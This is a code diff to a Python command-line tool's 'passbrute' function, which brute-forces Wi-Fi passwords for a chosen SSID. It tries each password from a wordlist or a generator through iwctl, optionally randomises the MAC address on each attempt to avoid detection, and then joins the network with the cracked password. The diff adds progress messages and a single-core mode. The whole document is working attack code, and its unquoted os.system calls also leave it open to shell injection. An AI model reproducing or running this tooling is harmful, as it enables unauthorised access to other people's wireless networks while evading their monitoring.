@@ -158,43 +158,98 @@ def passbrute():
     if use_brute_force:
         min_len = int(input("Minimum password length (default 1): ") or 1)
         max_len = int(input("Maximum password length (default 8): ") or 8)
+        typer.echo(f"🔧 Generating brute force passwords from length {min_len} to {max_len}...")
         password_generator = generate_brute_force(min_len, max_len)
+        typer.echo("✓ Password generator ready")
     else:
+        typer.echo(f"📋 Loaded {len(passwlist)} passwords from wordlist")
         password_generator = passwlist
 
     passw = ""
     
-    # Use multiprocessing for parallel password attempts
-    try:
-        # Determine number of cores - use 4 to avoid overwhelming the system
-        num_cores = min(4, os.cpu_count() or 4)
-        
-        with Pool(processes=num_cores) as pool:
-            # Create args list: (password, target_ssid) pairs
-            args_list = [(pwd, target_ssid) for pwd in password_generator]
+    # Ask user if they want to use multi-core
+    use_multicore = input("Use multi-core processing? (y/n, default: y): ").strip().lower()
+    use_multicore = use_multicore != 'n'  # Default to True unless explicitly 'n'
+    
+    if use_multicore:
+        # Use multiprocessing for parallel password attempts
+        try:
+            # Determine number of cores - use 4 to avoid overwhelming the system
+            num_cores = min(4, os.cpu_count() or 4)
+            typer.echo(f"⚡ Starting multi-core brute force with {num_cores} cores...")
+            typer.echo(f"🎯 Target SSID: {target_ssid}")
             
-            # Use imap_unordered for fastest results (doesn't maintain order)
-            for password, success, _ in pool.imap_unordered(check_password, args_list, chunksize=1):
-                if success:
-                    print(f"✅ Crack'd! Password is: {password}")
+            with Pool(processes=num_cores) as pool:
+                # Create args list: (password, target_ssid) pairs
+                args_list = [(pwd, target_ssid) for pwd in password_generator]
+                
+                # Use imap_unordered for fastest results (doesn't maintain order)
+                attempt_count = 0
+                for password, success, _ in pool.imap_unordered(check_password, args_list, chunksize=1):
+                    attempt_count += 1
+                    if success:
+                        typer.echo(f"✅ Crack'd! Password is: {password}")
+                        typer.echo(f"📊 Total attempts: {attempt_count}")
+                        passw = password
+                        pool.terminate()
+                        break
+                    else:
+                        if attempt_count % 10 == 0:
+                            typer.echo(f"⏳ Attempting... ({attempt_count} tried)")
+        except KeyboardInterrupt:
+            print("\nBrute force interrupted by user")
+            pool.terminate()
+            return
+        except Exception as e:
+            print(f"Error during brute force: {e}")
+            return
+    else:
+        # Single-core sequential mode
+        typer.echo("🐢 Starting single-core brute force (slower but thorough)...")
+        typer.echo(f"🎯 Target SSID: {target_ssid}")
+        if mac_change_preference_bool:
+            typer.echo("🔀 MAC address will change every attempt")
+        try:
+            attempt_count = 0
+            for password in password_generator:
+                attempt_count += 1
+                if mac_change_preference_bool:
+                    typer.echo(f"🔄 Attempt #{attempt_count}: Changing MAC address...")
+                    mac.rand()  # pyright: ignore[reportAttributeAccessIssue]
+                typer.echo(f"🔑 Attempt #{attempt_count}: Trying password...")
+                os.system(f"iwctl station wlan0 connect {target_ssid} password {password}")
+                
+                # Give it a moment to connect
+                time.sleep(1)
+                
+                connected_check = os.popen(f"iwctl station wlan0 show")
+                connected_check_output = connected_check.read()
+
+                # Check if the target SSID is actually connected (more specific check)
+                if f"Connected network: {target_ssid}" in connected_check_output or ("connected" in connected_check_output.lower() and target_ssid in connected_check_output):
+                    typer.echo(f"✅ Crack'd! Password is: {password}")
+                    typer.echo(f"📊 Total attempts: {attempt_count}")
                     passw = password
-                    pool.terminate()
                     break
                 else:
-                    print(f"❌ FUCK, Tried password: {password}")
-    except KeyboardInterrupt:
-        print("\nBrute force interrupted by user")
-        pool.terminate() 
-    except Exception as e:
-        print(f"Error during brute force: {e}")
-        return
+                    if attempt_count % 5 == 0:
+                        typer.echo(f"⏳ Still trying... ({attempt_count} attempts so far)")
+        except KeyboardInterrupt:
+            print("\nBrute force interrupted by user")
+            return
     
     print(passw)
 
     # Return to original MAC address
+    typer.echo("🔄 Restoring original MAC address...")
     mac.perm() # pyright: ignore[reportAttributeAccessIssue]
     # Use successfully cracked password to connect to the network
-    os.system(f"iwctl station wlan0 connect {target_ssid} password {passw} ")
+    if passw:
+        typer.echo(f"🔗 Connecting to {target_ssid} with cracked password...")
+        os.system(f"iwctl station wlan0 connect {target_ssid} password {passw} ")
+        typer.echo("✅ Process complete!")
+    else:
+        typer.echo("❌ No password found")
     
     """
         TO-DO LIST
